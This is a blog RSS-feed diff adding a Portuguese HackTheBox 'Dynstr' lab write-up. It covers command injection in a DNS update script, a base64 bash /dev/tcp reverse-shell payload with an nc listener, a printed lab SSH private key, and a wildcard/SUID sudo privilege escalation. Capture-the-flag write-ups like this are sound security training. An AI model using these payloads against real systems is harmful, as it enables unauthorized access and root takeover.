@@ -5,8 +5,283 @@
         <description>Recent content in Posts on Haderach</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 19 Oct 2021 18:57:35 -0300</lastBuildDate>
+        <lastBuildDate>Thu, 21 Oct 2021 12:28:42 -0300</lastBuildDate>
         <atom:link href="https://brunomcuesta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HackTheBox - Dynstr</title>
+            <link>https://brunomcuesta.github.io/posts/2021/10/hackthebox-dynstr/</link>
+            <pubDate>Thu, 21 Oct 2021 12:28:42 -0300</pubDate>
+            
+            <guid>https://brunomcuesta.github.io/posts/2021/10/hackthebox-dynstr/</guid>
+            <description>Nesta máquina do HackTheBox o atacante deve explorar uma vulnerabilidade em um servidor de DNS dinâmico. Um script PHP, que é responsável pela atualização dos nomes de subdomínios, recebe um parâmetro via GET e o executa sem nenhum tipo de tratamento, o que permite a um atacante injetar código malicioso em um request e acessar o servidor. O script executa o nsupdate, o que permite ao invasor o registro de um subdomínio no server.</description>
+            <content type="html"><![CDATA[
+    <img src="https://i.imgur.com/gSSI70J.png"  alt="Dynstr Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Nesta máquina do HackTheBox o atacante deve explorar uma vulnerabilidade em um servidor de DNS dinâmico. Um script PHP, que é responsável pela atualização dos nomes de subdomínios, recebe um parâmetro via GET e o executa sem nenhum tipo de tratamento, o que permite a um atacante injetar código malicioso em um request e acessar o servidor. O script executa o <a href="https://linux.die.net/man/8/nsupdate">nsupdate</a>, o que permite ao invasor o registro de um subdomínio no server. Com uma enumeração local se descobre a chave SSH de um usuário que permite acesso remoto ao servidor. O usuário local possui permissões para executar um script com o sudo e desta forma é possível escalar privilégios abusando da vulnerabilidade no script.</p>
+<h2 id="informações-da-máquina">Informações da Máquina</h2>
+<p>IP: 10.10.10.244</p>
+<p>Sistema Operacional: Linux</p>
+<p>Nível de dificuldade: Medium</p>
+<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>Iniciando um scan completo em todas as portas TCP abertas com nmap descobrimos apenas três portas: 22 (SSH), 53 (DNS) e 80 (HTTP). O sistema operacional do host é Ubuntu Linux.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Fri Jul 16 22:55:22 2021 as: nmap -v -sV -sC -p 22,53,80 -Pn -oN details.txt 10.10.10.244</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.244
+Host is up <span style="color:#f92672">(</span>0.21s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+53/tcp open  domain  ISC BIND 9.16.1 <span style="color:#f92672">(</span>Ubuntu Linux<span style="color:#f92672">)</span>
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Fri Jul 16 22:55:41 2021 -- 1 IP address (1 host up) scanned in 18.60 seconds</span>
+</code></pre></div><p>Enumerando diretórios e arquivos na raíz da aplicação web com gobuster encontramos um diretório chamado <strong>nic</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.244 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+/nic                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 310<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.244/nic/<span style="color:#f92672">]</span> 
+</code></pre></div><p>Prosseguindo com o scan neste diretório surge um recurso chamado <strong>update</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.244/nic -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+/update               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 8<span style="color:#f92672">]</span>
+</code></pre></div><h3 id="webserver">Webserver</h3>
+<p>Página inicial.</p>
+
+    <img src="https://i.imgur.com/lVX5Q1W.png"  alt="Página inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Inspecionando a página inicial encontramos domínios, que podem ser adicionados ao /etc/hosts para ter acesso através de seu nome. O site informa claramente que se trata de um servidor de DNS dinâmico. Também aparecem credenciais que podem dar acesso a algum recurso no servidor.</p>
+
+    <img src="https://i.imgur.com/cHlj5Ro.png"  alt="Domínios e credencial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Credenciais.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Username: dynadns
+Password: sndanyd
+</code></pre></div><p>Adicionando os domínios ao /etc/hosts.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">dyna.htb
+dnsalias.htb
+dynamicdns.htb
+no-ip.htb
+</code></pre></div><p>Acessando a página web com o resultado do scan recebemos a mensagem &ldquo;badauth&rdquo; (não autorizado).</p>
+
+    <img src="https://i.imgur.com/ZGXNCKS.png"  alt="Badauth message"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No site do <strong>no-ip</strong> podemos conferir como funciona a API para efetuar <a href="https://www.noip.com/integrate/request">request</a> e obter <a href="https://www.noip.com/integrate/response">response</a>.</p>
+
+    <img src="https://i.imgur.com/okosL9I.png"  alt="Badauth message"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Exemplo de requisição para atualizar o DNS.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25
+</code></pre></div><p>Exemplo de header GET request.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">GET /nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25 HTTP/1.1
+Host: dynupdate.no-ip.com
+Authorization: Basic base64-encoded-auth-string
+User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
+</code></pre></div><p>Analisando o exemplo acima, e levando em conta os domínios encontrados no site Dyna DNS, a credencial deve ser enviada em base64 no request. Desta forma o atacante poderá registrar seu nome de subdomínio junto ao servidor.</p>
+<h2 id="vulnerabilidade">Vulnerabilidade</h2>
+<p>A vulnerabilidade está na requisição para executar o update no servidor DNS, especificamente no parâmetro <strong>hostname</strong>. Este é o parâmetro que permite o registro de um nome de subdomínio. E de acordo com o response do servidor, não há tratamento do que está sendo enviado e executado internamente.</p>
+<h2 id="exploração">Exploração</h2>
+<p>Gerando o payload em base64.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo ‘bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1’ | base64
+</code></pre></div><p>Com a hash base64 do comando acima podemos montar o payload para ser injetado no parâmetro hostname pelo BurpSuite.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">`echo &lt;base64-hash&gt; | base64 -d | bash`
+</code></pre></div><p>Para adicionar o código malicioso ao hostname o request foi interceptado pelo BurpSuite. Um ponto importante é utilizar <a href="https://www.urlencoder.org/">url encode</a> no payload para que os caracteres especiais sejam aceitos pelo servidor.</p>
+
+    <img src="https://i.imgur.com/fK7IpvY.png"  alt="BurpSuite"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O request também pode ser efetuado pelo curl.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://dyna.htb/nic/update?hostname=&lt;payload&gt;dnsalias.no-ip.htb&amp;myip=&lt;tun0-ip&gt;&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Basic ZHluYWRuczpzbmRhbnlk&#34;</span>
+</code></pre></div><p>Abrindo uma porta local para receber o &lsquo;reverse shell&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rlwrap nc -lvnp <span style="color:#ae81ff">9001</span>
+</code></pre></div><p>Após o envio do request pelo curl ou BurpSuite recebemos a shell do servidor com o usuário www-data.</p>
+
+    <img src="https://i.imgur.com/72YWPtW.png"  alt="Reverse shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Enumerando o diretório &lsquo;nic&rsquo; foi encontrado um script PHP chamado &ldquo;update&rdquo;, responsável pela atualização de subdomínios no servidor.</p>
+
+    <img src="https://i.imgur.com/FVZpshK.png"  alt="Update file"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Analisando o script PHP podemos visualizar a vulnerabilidade no parâmetro <strong>hostname</strong>. O payload é rebebido com <strong>$_GET[&lsquo;hostname&rsquo;]</strong> e armazenado na variável <strong>$h</strong> através de interpolação. Logo abaixo aparece um <strong>$cmd</strong>, que é outra variável e monta a string de comando a ser executada no servidor (e junto vai o comando malicioso injetado pelo atacante). Finalmente surge o comando <strong>system</strong> do PHP que vai executar a string de comando armazenada em <strong>$cmd</strong>.</p>
+<p>Estas são as linhas do script que permitiram a exploração da vulnerabilidade através do curl e BurpSuite.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">list</span>($h,$d) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$_GET[<span style="color:#e6db74">&#39;hostname&#39;</span>],<span style="color:#ae81ff">2</span>); 
+$cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;server 127.0.0.1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">zone %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">update delete %s.</span><span style="color:#e6db74">$s\nupdate</span><span style="color:#e6db74"> add %s.%s 30 IN A %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">send</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,$d,$h,$d,$h,$d,$myip);
+<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;echo &#34;&#39;</span><span style="color:#f92672">.</span>$cmd<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key&#39;</span>, $retval);
+</code></pre></div><p>Neste ponto é necessário uma observação em relação ao desenvolvimento de aplicações e scripts. Receber parâmetros e executá-los sem nenhum tipo de tratamento resulta no que está exposto nesta etapa de exploração, uma invasão a um servidor de DNS. Aqui entra o que atualmente se conhece como &ldquo;desenvolvimento seguro&rdquo;. Isto é, tratar o que é recebido antes de ser executado. A função de um Pentester é justamente explorar estas vulnerabilidades e se houver algum tipo de tratamento, buscar uma maneira de efetuar o &lsquo;bypass&rsquo; utilizando payloads diferentes.</p>
+<p>Em busca de credenciais no host encontramos o usuário <strong>bindmgr</strong> com chaves SSH em seu diretório. Porém, sem permissão para leitura na id_rsa.</p>
+
+    <img src="https://i.imgur.com/5QPZ14B.png"  alt="Bindmgr folder"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No mesmo diretório do usuário encontramos o diretório support-case-C62796521 com o seguinte conteúdo.</p>
+
+    <img src="https://i.imgur.com/byHP85E.png"  alt="support-case-c62796521 folder"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Inspecionando os arquivos da pasta foi localizada a chave SSH no arquivo strace-C62796521.txt.</p>
+
+    <img src="https://i.imgur.com/o3RfTJq.png"  alt="Chave SSH"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Com o comando echo podemos criar um arquivo &lsquo;key&rsquo; que será a chave SSH para acessar remotamente o servidor.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37
+</span><span style="color:#e6db74">HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\
+</span><span style="color:#e6db74">nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+Nz
+</span><span style="color:#e6db74">B2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMI
+</span><span style="color:#e6db74">fdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPV
+</span><span style="color:#e6db74">Ws\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuP
+</span><span style="color:#e6db74">Y422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV
+</span><span style="color:#e6db74">7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2
+</span><span style="color:#e6db74">vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span> &gt; key
+</code></pre></div><p>Setando permissões ao arquivo key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> key
+</code></pre></div><p>Apesar de ter a chave SSH a conexão não pôde ser realizada porque o servidor não aceita conexões vindas de outros hosts que não tenham seus nomes registrados. A informação pode ser conferida no arquivo authorized_keys na pasta oculta .ssh do usuário bindmgr.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat authorized_keys
+</code></pre></div><p>Somente nomes com seus IP&rsquo;s associados e registrados no domínio <strong>infra.dyna.htb</strong> podem se conectar.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">from=&#34;*.infra.dyna.htb&#34;
+</code></pre></div><p>Para registrar um nome ao server foi utilizado o <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">nsupdate</a>, que está sendo usado pelo script update.</p>
+
+    <img src="https://i.imgur.com/A035mZ9.png"  alt="Nsupdate"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>A key do domínio infra está localizada em /etc/bind/infra.key.</p>
+
+    <img src="https://i.imgur.com/WbtrI0Q.png"  alt="infra.key"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Exemplo de uso do nsupdate com a key da infra.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nsupdate -k /etc/bind/infra.key
+update add haderach.infra.dyna.htb <span style="color:#ae81ff">86400</span> A 10.10.14.110
+update add 110.14.10.10.in-addr.arpa <span style="color:#ae81ff">86400</span> PTR haderach.infra.dyna.htb
+send
+</code></pre></div><p>No último comando nsupdate acima é <a href="https://dnschecker.org/reverse-dns.php">registrado o PTR</a> (pointer record ou reverse DNS record) e informado o IP de forma reversa.</p>
+
+    <img src="https://i.imgur.com/fwKheCe.png"  alt="Nsupdate add"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Acessando o servidor via SSH após o registro do nome &ldquo;haderach.infra.dyna.htb&rdquo; e obtendo a flag no arquivo user.txt.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i key bindmgr@10.10.10.244
+</code></pre></div>
+    <img src="https://i.imgur.com/ThxsBdP.png"  alt="Nsupdate add"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
+<p>O usuário bindmgr possui privilégios de root no script <strong>bindmgr.sh</strong> com o sudo e sem necessidade de informar a senha do usuário.</p>
+
+    <img src="https://i.imgur.com/jFB9Hrf.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Conteúdo do script bindmgr.sh.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># This script generates named.conf.bindmgr to workaround the problem</span>
+<span style="color:#75715e"># that bind/named can only include single files but no directories.</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
+<span style="color:#75715e"># from named.conf.local (or others) and will include all files from the</span>
+<span style="color:#75715e"># directory /etc/bin/named.bindmgr.</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># NOTE: The script is work in progress. For now bind is not including</span>
+<span style="color:#75715e">#       named.conf.bindmgr. </span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># TODO: Currently the script is only adding files to the directory but</span>
+<span style="color:#75715e">#       not deleting them. As we generate the list of files to be included</span>
+<span style="color:#75715e">#       from the source directory they won&#39;t be included anyway.</span>
+
+BINDMGR_CONF<span style="color:#f92672">=</span>/etc/bind/named.conf.bindmgr
+BINDMGR_DIR<span style="color:#f92672">=</span>/etc/bind/named.bindmgr
+
+indent<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> sed <span style="color:#e6db74">&#39;s/^/    /&#39;</span>; <span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Check versioning (.version)</span>
+echo <span style="color:#e6db74">&#34;[+] Running </span>$0<span style="color:#e6db74"> to stage new configuration from </span>$PWD<span style="color:#e6db74">.&#34;</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -f .version <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
+    exit <span style="color:#ae81ff">42</span>
+<span style="color:#66d9ef">fi</span>
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span style="color:#e6db74">&#34;`cat </span>$BINDMGR_DIR<span style="color:#e6db74">/.version 2&gt;/dev/null`&#34;</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
+    exit <span style="color:#ae81ff">43</span>
+<span style="color:#66d9ef">fi</span>
+
+<span style="color:#75715e"># Create config file that includes all files from named.bindmgr.</span>
+echo <span style="color:#e6db74">&#34;[+] Creating </span>$BINDMGR_CONF<span style="color:#e6db74"> file.&#34;</span>
+printf <span style="color:#e6db74">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; $BINDMGR_CONF
+<span style="color:#66d9ef">for</span> file in * ; <span style="color:#66d9ef">do</span>
+    printf <span style="color:#e6db74">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span style="color:#e6db74">&#34;</span>$file<span style="color:#e6db74">&#34;</span> &gt;&gt; $BINDMGR_CONF
+<span style="color:#66d9ef">done</span>
+
+<span style="color:#75715e"># Stage new version of configuration files.</span>
+echo <span style="color:#e6db74">&#34;[+] Staging files to </span>$BINDMGR_DIR<span style="color:#e6db74">.&#34;</span>
+cp .version * /etc/bind/named.bindmgr/
+
+<span style="color:#75715e"># Check generated configuration with named-checkconf.</span>
+echo <span style="color:#e6db74">&#34;[+] Checking staged configuration.&#34;</span>
+named-checkconf $BINDMGR_CONF &gt;/dev/null
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+    echo <span style="color:#e6db74">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
+    named-checkconf $BINDMGR_CONF 2&gt;&amp;<span style="color:#ae81ff">1</span> | indent
+    exit <span style="color:#ae81ff">44</span>
+<span style="color:#66d9ef">else</span> 
+    echo <span style="color:#e6db74">&#34;[+] Configuration successfully staged.&#34;</span>
+    <span style="color:#75715e"># *** TODO *** Uncomment restart once we are live.</span>
+    <span style="color:#75715e"># systemctl restart bind9</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
+        echo <span style="color:#e6db74">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
+	systemctl status bind9
+    <span style="color:#66d9ef">else</span>
+	echo <span style="color:#e6db74">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
+    <span style="color:#66d9ef">fi</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>O script verifica se existe um arquivo <strong>.version</strong> com um número de versão na pasta atual e copia todos os arquivos da pasta para o diretório named.bindmgr, como informado na linha abaixo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp .version * /etc/bind/named.bindmgr/
+</code></pre></div><p>A forma de escalar privilégios é criar um arquivo .version e copiar o bash (/bin/bash) para a pasta local.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#ae81ff">1</span> &gt; .version
+cp /bin/bash .
+</code></pre></div><p>Dar a este novo bash um bit <a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">SUID</a> e preservar o modo neste binário criando um arquivo &ldquo;&ndash;preserve=mode&rdquo;. Quando o script for executado teremos um binário com privilégios de root em /etc/bind/named.bindmgr/.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +s bash
+echo &gt; --preserve<span style="color:#f92672">=</span>mode
+</code></pre></div><p>Executando o script com o sudo para copiar o novo bash para o diretório named.bindmgr.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/local/bin/bindmgr.sh 
+</code></pre></div><p>Executando a cópia do bash e obtendo a shell do root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/etc/bind/named.bindmgr/bash -p
+</code></pre></div>
+    <img src="https://i.imgur.com/qx8mMgD.png"  alt="Root shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag no arquivo root.txt.</p>
+
+    <img src="https://i.imgur.com/sVdVPFJ.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste writeup alguns pontos importantes sobre segurança puderam ser abordados.</p>
+<ul>
+<li>Parâmetros devem ser tratados antes de serem passados para execução por uma aplicação ou script.</li>
+<li>O sudo deve ser usado com a senha do usuário.</li>
+<li>Usar * (asterisco) como argumento em um script pode ser perigoso.</li>
+</ul>
+<p>Até a próxima!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Extraindo credenciais e arquivos de pcap com o Zeek</title>
